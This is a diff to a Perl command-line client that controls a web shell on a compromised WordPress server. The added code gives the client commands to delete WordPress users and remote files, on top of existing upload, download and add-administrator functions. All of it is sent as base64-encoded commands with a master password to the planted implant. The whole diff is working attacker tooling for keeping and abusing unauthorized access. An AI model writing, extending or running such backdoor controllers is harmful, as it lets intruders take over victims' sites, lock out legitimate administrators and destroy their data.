@@ -190,6 +190,7 @@ sub browser {
 			case "download" { down_file($opt[1],$opt[2]); }
 			case "upload" { upload($opt[1],$opt[2]); }
 			case "help" { help_browser(); }
+			case "delete" { del_file($opt[1]);}
 			else { print colored("\n[-] ", red) . colored("Command not found. Try <", cyan) . colored("help", yellow) . colored("> to list all commands\n\n",cyan); }
 		}
 	}
@@ -262,6 +263,13 @@ sub add_admin {
 	$do = send_it($url, $head_pass, $master_pass, $head_exe, encode_base64("wp_addadmin")."**". encode_base64($admin_user)."**".encode_base64($admin_pass));
 	print "\n";
 }
+
+sub del_user {
+	print colored("[?] ", red) . colored("Insert login name: ", cyan);
+	$user = <STDIN>;
+	chomp($user);
+	$do = send_it($url, $head_pass, $master_pass, $head_exe, encode_base64("wp_delete_user")."**". encode_base64($user));
+}
 sub down_file{
 	$local_file = $_[1];
 	$remote_file = $_[0];
@@ -270,6 +278,12 @@ sub down_file{
 	$do = send_it($url, $head_pass, $master_pass, $head_exe, $opt);
 	print FILE $do;
 	close(FILE);
+}
+
+sub del_file{
+	$file = $_[0];
+	$del = encode_base64("browse") . "**" . encode_base64("delete**".$this_dir."/".$file);
+	$do = send_it($url, $head_pass, $master_pass, $head_exe, $del);
 }
 
 sub db_def() {
@@ -315,6 +329,7 @@ while (1) {
 		case "wp_status" { wp_status(); }
 		case "wp_add_admin" { add_admin(); }
 		case "help" { help_general(); }
+		case "wp_delete_user" { del_user(); }
 		else { print colored("\n[-] ", red) . colored("Command not found. Try <", cyan) . colored("help", yellow) . colored("> to list all commands\n\n",cyan); }
 	}
 }
@@ -375,6 +390,7 @@ sub help_general() {
 	db_def_credentials 	-- If compromised server is not a WordPress, you need to set DB credentials
 	wp_status		-- Shows info related to the WordPress
 	wp_add_admin		-- Adds an administrator user
+	wp_delete_user		-- Delete an user from the DB
 
 
 );
@@ -388,7 +404,7 @@ sub help_browser() {
 	ls		-- List al files/directories in current path
 	download	-- Download a file
 	upload		-- Upload a file
-
+	delete		-- Delete a file
 
 );
 }
